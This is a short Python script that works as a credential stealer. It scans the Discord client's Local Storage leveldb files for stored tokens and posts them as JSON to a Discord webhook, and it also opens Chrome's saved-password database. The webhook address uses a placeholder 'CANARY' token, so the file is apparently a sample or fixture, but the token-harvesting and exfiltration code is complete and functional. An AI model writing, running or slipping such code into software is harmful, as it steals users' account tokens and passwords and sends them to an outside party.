import os, re, json, base64
import requests

HOOK = "https://discord.com/api/webhooks/000000000000/CANARY_not_a_real_token"
LOCAL = os.getenv("LOCALAPPDATA", "")
ROAMING = os.getenv("APPDATA", "")


def tokens():
    path = ROAMING + "\\discord\\Local Storage\\leveldb"
    out = []
    for name in os.listdir(path):
        for line in open(os.path.join(path, name), errors="ignore"):
            out += re.findall(r"dQw4w9WgXcQ:[^\"]*", line)
    return out


def passwords():
    db = LOCAL + "\\Google\\Chrome\\User Data\\Default\\Login Data"
    return open(db, "rb").read()[:10]


def run():
    requests.post(HOOK, json={"content": json.dumps(tokens())})
